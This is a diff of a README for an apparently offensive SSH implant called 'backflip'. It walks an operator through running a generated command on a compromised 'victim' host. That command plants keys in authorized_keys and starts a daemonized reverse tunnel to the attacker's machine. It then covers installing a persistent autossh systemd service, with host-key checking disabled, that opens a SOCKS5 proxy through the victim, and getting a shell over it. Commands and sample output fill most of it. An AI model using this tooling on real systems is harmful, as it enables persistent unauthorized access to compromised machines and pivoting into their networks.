@@ -10,28 +10,26 @@ deploys keys to make this all possible.
   need to be managed out of band. Implement a process and use it.
 * You are running an additional ssh server that your victims ssh
   to. This can be abused by somebody who has control of the victim
-  machine. While shell access is disabled, only reverse forwarding
-  will work.
+  machine. While shell access is disabled, and only reverse forwarding
+  will work, one should be aware of this caveat.
 
 
 # Moving Parts
-* implant.py
+## `implant.py`
+embedded in install_implant.py that daemonizes and makes ssh
+connections. Note that the current implementation uses
+`subprocess.Popen` with `shell=True`, which will cause an `execve`
+with `sh -c` to appear in logs.
 
-A script embedded in install_implant.py that daemonizes and makes ssh
-connections
+## `install_implant.py`
+runs on client that provisions the keys and runs evil.py
 
-* install_implant.py
+## `make_backflip.py`
+runs on the attack machine that gives the cut-n-paste command to
+run on victim
 
-A script that runs on client that provisions the keys and runs evil.py
-
-* make_backflip.py
-
-A script that runs on the attack machine that gives the cut-n-paste
-command to run on victim
-
-* install_proxy.py
-
-A script to install and start a socks proxy back to victim
+## `install_proxy.py`
+installs and start a socks proxy back to victim
 
 # How to Setup a Backflip
 
@@ -40,72 +38,74 @@ at 10.50.0.1. We our reverse port-forwards are on ports 4000 onwards
 and our socks proxies are on ports 5000 onwards
 
 1. Get a shell on victim host
-1. run `install_implant.py`
 
-Assuming you are doing this on proxy01 and victim username is ubuntu: 
-```
-  sudo ./make_backflip.py ubuntu 10.0.0.1 10.50.0.1 4000
-```
+1. run `make_backflip.py`
 
-This will leave port 4000 on proxy01 with a remote connection to
-10.0.0.1 on 22 when the command that is outputed is run on the
-victim. Note that you will need to allocate a new port with each
-blackflip created.
-  
-1. run the command spit out on the victim
-  You should see output like:
-  ```
-  [+] keypath: /home/ubuntu/.ssh/id_rsab
-  [+] wrote private key: /home/ubuntu/.ssh/id_rsab
-  [+] wrote public key: /home/ubuntu/.ssh/id_rsab.pub
-  [+] wrote to ~/.ssh/authorized_keys
-  [+] started daemonized tunnel
-  [*] waiting one minute for tunnel to come up...
-  [+] tunnel running
-  ```
-  
+	The invocation is `make_backflip.py <user> <victim-ip> <attacker-ip> <reverse listen port>`.
+	Assuming the victim username is ubuntu, attack and victim ip given
+	above, and listen port 4000:
+
+		sudo ./make_backflip.py ubuntu 10.0.0.1 10.50.0.1 4000
+
+	This will make port 4000 on proxy01 with a remote connection to
+	10.0.0.1 on 22 when the command that is outputed is run on the
+	victim. This will also create a keypair on the attack machine in
+	`/opt/backflip/keys` with the format `<username>-<victim>-<attack>`.
+	Note that you will need to allocate a new port with each blackflip
+	created.
+
+1. run the command that `make_backflip.py` outputs on the victim
+
+   You should see output like:
+
+		[+] keypath: /home/ubuntu/.ssh/id_rsab
+		[+] wrote private key: /home/ubuntu/.ssh/id_rsab
+		[+] wrote public key: /home/ubuntu/.ssh/id_rsab.pub
+		[+] wrote to ~/.ssh/authorized_keys
+		[+] started daemonized tunnel
+		[*] waiting one minute for tunnel to come up...
+		[+] tunnel running
+
 1. run `install_proxy.py`
 
-`install_proxy` will create a systemd service to initiate the ssh
-connection to the victim and reverse port-forward a connection to
-their ssh daemon on the attack system. Additionally, it will setup a
-SOCKS5 proxy listening on a port you specify. As above, it is
-important to note which SOCKS port you are using and each backflip
-will require a unique one.
+	`install_proxy.py` will create a systemd service to initiate the ssh
+	connection to the victim and reverse port-forward a connection to
+	their ssh daemon on the attack system. Additionally, it will setup a
+	SOCKS5 proxy listening on a port you specify. As above, it is
+	important to note which SOCKS port you are using and each backflip
+	will require a unique one.
 
-In this example, we setup a persistant ssh connection with reverse
-forward as well as a socks proxy on port 5000:
-```
-sudo ./install_proxy.py 4000 5000 /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1
-contents:
-[Unit]
-Description=ssh backflip to 4000
-After=network.target auditd.service
+	In this example, we setup a persistant ssh connection with reverse
+	forward as well as a socks proxy on port 5000:
 
-[Service]
-ExecStart=/usr/bin/autossh -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :5000 -i /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1 -p4000 ubuntu@localhost
+		sudo ./install_proxy.py 4000 5000 /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1
+		contents:
+		[Unit]
+		Description=ssh backflip to 4000
+		After=network.target auditd.service
 
-[Install]
-WantedBy=multi-user.target
+		[Service]
+		ExecStart=/usr/bin/autossh -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :5000 -i /opt/backflips/keys/ubuntu-10.0.0.1-10.50.0.1 -p4000 ubuntu@localhost
 
-Created symlink /etc/systemd/system/multi-user.target.wants/backflip-4000-5000.service → /etc/systemd/system/backflip-4000-5000.service.
-```
+		[Install]
+		WantedBy=multi-user.target
 
-You can see that the proxy and ssh backflip are up:
-```
-$ sudo netstat -lntp | grep -E "4000|5000"
-tcp        0      0 0.0.0.0:4000            0.0.0.0:*               LISTEN      20612/sshd: flip
-tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      20693/ssh
-tcp6       0      0 :::4000                 :::*                    LISTEN      20612/sshd: flip
-tcp6       0      0 :::5000                 :::*                    LISTEN      20693/ssh
-```
+		Created symlink /etc/systemd/system/multi-user.target.wants/backflip-4000-5000.service → /etc/systemd/system/backflip-4000-5000.service.
 
-Notice that ssh is listening on 0.0.0.0, meaning that these services
-are available throughout the subnet.
+	You can see that the proxy and ssh backflip are up:
+	
+		$ sudo netstat -lntp | grep -E "4000|5000"
+		tcp        0      0 0.0.0.0:4000            0.0.0.0:*               LISTEN      20612/sshd: flip
+		tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      20693/ssh
+		tcp6       0      0 :::4000                 :::*                    LISTEN      20612/sshd: flip
+		tcp6       0      0 :::5000                 :::*                    LISTEN      20693/ssh
+
+	Notice that ssh is listening on 0.0.0.0, meaning that these services
+	are available throughout the subnet.
 
 # How to Use a Backflip
 
-There are two primary ways to use a backflip, shell access and proxy access.
+There are two primary ways to use a backflip: shell access and proxy access.
 
 ## Get a Shell
 
@@ -128,7 +128,6 @@ The following will reward you with a shell on the victim:
 ssh -i ~/.ssh/ubuntu-10.0.0.1-10.50.0.1 -p 4000 ubuntu@127.0.0.1
 ```
 
-
 ## Use a SOCKS5 Proxy
 
 In our example above, there is a SOCKS5 proxy running on
@@ -138,22 +137,22 @@ command line tools with the help of a proxy LD_PRELOAD library.
 
 For example, a `proxychains.conf` in the current working directory
 with contents as such:
-```
-strict_chain
-# Quiet mode (no output from library)
-#quiet_mode
-proxy_dns 
 
-# Some timeouts in milliseconds
-tcp_read_time_out 15000
-tcp_connect_time_out 8000
+	strict_chain
+	# Quiet mode (no output from library)
+	#quiet_mode
+	proxy_dns 
 
-[ProxyList]
-socks5  127.0.0.1 5000
-```
+	# Some timeouts in milliseconds
+	tcp_read_time_out 15000
+	tcp_connect_time_out 8000
+
+	[ProxyList]
+	socks5  127.0.0.1 5000
 
 We can verify that our SOCKS proxy works with curl as we see our
 victim IP instead of our attack IP:
+
 ```
 $ proxychains curl ifconfig.me; echo
 ProxyChains-3.1 (http://proxychains.sf.net)
